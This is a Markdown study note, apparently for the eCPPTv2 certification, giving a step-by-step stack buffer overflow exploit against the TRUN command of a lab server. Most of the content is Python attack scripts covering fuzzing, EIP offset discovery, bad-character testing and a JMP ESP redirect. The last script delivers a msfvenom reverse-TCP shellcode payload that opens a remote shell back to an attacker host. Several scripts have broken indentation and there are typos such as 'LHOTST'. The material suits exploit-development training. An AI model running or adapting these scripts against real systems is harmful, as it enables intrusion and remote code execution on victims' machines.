# Buffer Overflow

ESP ⇒ Top of stack

EBP ⇒ bottom of the stack

EIP ⇒ next instruction will be executed

---

## Vulnerable Functions

* 1-strcpy , strcat 
* 2-vsprintf , printf
* 3-gets , fgets
* 4-scanf , fscanf
* 5-memcpy

---

## Security Implementation for buffer overflow remediation

* 1-Address space layout randomization (ASLR)

* 2-Data Execution prevention (EDP)

* 3-Stack Cookies (Canary)

---

## Steps to produce 

1-Fuzzing and Detect the bug via send bytes and when connection refused that means the systems crashed

```
 #!/user/bin/python
import sys,socket
from time import sleep

# Detect BOF

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        s.connect(('The IP',PORTHere))

        s.send(('TRUN /.:/' + buffer ))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print("Fuzzing crashed at {} bytes".format(str(len(buffer))))
        sys.exit()
```


2-Determine the offset by generate pattern

```
msf-pattern_create -l 3000
```
```
#!/user/bin/python

import sys, socket

# Get Pattern 
#The Pattern Here via the following command  (msf-pattern-create -l 600)  (600 is buffer crashed
buffer = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9")
while True:
    try:
				s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
				s.connect(('IP Here' , PortHere))
				s.send(('TRUN /.:/' + buffer))
				print(buffer)
				s.close()
except:
        print("Error")
        sys.exit()
```

```
msf-pattern_offset -l 3000 -q 39654138   # 39654138  is the EIP  from immunity
```


3-Overwriting the EIP

```
#!/user/bin/python

import sys, socket

# Get Pattern 
#If buffer that crashed the server is = 3000 
# run ./pattern_offset.rb -q 1234568  (the result is 2003)
buffer = "A" * 2003 + "B" * 4 
while True:
    try:
				s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
				s.connect(('IP Here' , PortHere))
				s.send(('TRUN /.:/' + buffer))
				print(buffer)
				s.close()
except:
        print("Fuzzing crashed at {} bytes".format(str(len(buffer))))
        sys.exit()
```

4-Find bad char

```
#!/user/bin/python

import sys, socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
while True:
    try:
	buffer = "A" * 2003 + "B" * 4 + badchars
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	s.connect(('IP Here' , PortHere))
	s.send(('TRUN /.:/' + buffer))
	print(buffer)
	s.close()
    except:
        print("Error")
        sys.exit()
```

5-send reverse shell

At first you should choose the right module using mona at the following Repo https://github.com/coreian/mona put the [mona.py](http://mona.py) in “C:/Program Files (x86)/Immunity Inc/immunity Debugger/PyCommands/” Then run it from immunity debugger GUI

```
!mona modules
```

Choose the marked “false” under SafeSEN flag

![image](https://github.com/mohamedabdelhady933/eCPPTv2-Notes/assets/73122852/f62dd9f0-4faf-4a4c-974b-dd5aacbff8f3)

Run this mona script

```
!mona find -s "\xff\xe4" -m essfunc.dll

#essfunc.dll  is the unsafed module from above
```

The address of the module is 0x625011af


![image](https://github.com/mohamedabdelhady933/eCPPTv2-Notes/assets/73122852/6e63ebd9-d03e-4d31-9559-1604cd0cf32a)

```
#!/user/bin/python
import sys, socket

#create shell via msfvenom
#msfvenom -p windows/shell_reverse_tcp LHOTST=192.168.10.11 LPORT=5555 EXITFUNC=thread -f c -a x86  -b "\x00 and bad chars here"

shellcode=("Shell here from msfvenom")

# the ESP address for jump is 0x625011af

buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode

while True:
    try:
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	s.connect(('192.168.131.148' , 9999))
	s.send(('TRUN /.:/' + buffer))
	print(buffer)
	s.close()
    except:
        print("Error")
        sys.exit()
```
